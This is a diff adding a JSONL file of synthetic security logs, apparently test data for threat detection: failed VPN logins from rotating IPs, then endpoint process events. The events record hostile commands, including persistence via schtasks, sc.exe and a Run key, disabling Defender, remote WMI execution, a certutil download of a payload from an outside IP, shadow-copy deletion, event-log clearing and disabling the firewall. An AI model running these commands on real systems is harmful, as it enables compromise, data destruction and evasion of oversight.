@@ -1,0 +1,16 @@
+{"timestamp":"2026-08-17T17:00:00Z","source_type":"auth","host":"vpn-02","user":"sam","src_ip":"198.51.100.10","action":"login_failed","message":"Invalid password"}
+{"timestamp":"2026-08-17T17:01:00Z","source_type":"auth","host":"vpn-02","user":"sam","src_ip":"198.51.100.11","action":"login_failed","message":"Invalid password"}
+{"timestamp":"2026-08-17T17:02:00Z","source_type":"auth","host":"vpn-02","user":"sam","src_ip":"198.51.100.12","action":"login_failed","message":"Invalid password"}
+{"timestamp":"2026-08-17T17:03:00Z","source_type":"auth","host":"vpn-02","user":"sam","src_ip":"198.51.100.13","action":"login_failed","message":"Invalid password"}
+{"timestamp":"2026-08-17T17:04:00Z","source_type":"auth","host":"vpn-02","user":"sam","src_ip":"198.51.100.14","action":"login_failed","message":"Invalid password"}
+{"timestamp":"2026-08-17T17:05:00Z","source_type":"auth","host":"vpn-02","user":"sam","src_ip":"198.51.100.15","action":"login_failed","message":"Invalid password"}
+{"timestamp":"2026-08-17T17:10:00Z","source_type":"endpoint","host":"ws-31","user":"sam","action":"process_start","command":"schtasks /create /tn Updater /tr C:\\Temp\\update.exe /sc onlogon","message":"Process created"}
+{"timestamp":"2026-08-17T17:11:00Z","source_type":"endpoint","host":"ws-31","user":"sam","action":"process_start","command":"sc.exe create Updater binPath= C:\\Temp\\update.exe","message":"Process created"}
+{"timestamp":"2026-08-17T17:12:00Z","source_type":"endpoint","host":"ws-31","user":"sam","action":"process_start","command":"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\Temp\\update.exe","message":"Registry modification command"}
+{"timestamp":"2026-08-17T17:13:00Z","source_type":"endpoint","host":"ws-31","user":"sam","action":"process_start","command":"powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true","message":"Process created"}
+{"timestamp":"2026-08-17T17:14:00Z","source_type":"endpoint","host":"ws-31","user":"sam","action":"process_start","command":"wmic /node:ws-44 process call create cmd.exe","message":"Remote WMI process execution"}
+{"timestamp":"2026-08-17T17:15:00Z","source_type":"endpoint","host":"ws-31","user":"sam","action":"process_start","command":"certutil -urlcache -split -f http://203.0.113.50/payload.exe C:\\Temp\\payload.exe","message":"Process created"}
+{"timestamp":"2026-08-17T17:16:00Z","source_type":"endpoint","host":"ws-31","user":"sam","action":"process_start","command":"powershell.exe","message":"WINWORD.EXE spawned powershell.exe"}
+{"timestamp":"2026-08-17T17:17:00Z","source_type":"endpoint","host":"ws-31","user":"sam","action":"process_start","command":"vssadmin delete shadows /all /quiet","message":"Process created"}
+{"timestamp":"2026-08-17T17:18:00Z","source_type":"endpoint","host":"ws-31","user":"sam","action":"process_start","command":"wevtutil cl Security","message":"Process created"}
+{"timestamp":"2026-08-17T17:19:00Z","source_type":"endpoint","host":"ws-31","user":"sam","action":"process_start","command":"netsh advfirewall set allprofiles state off","message":"Process created"}
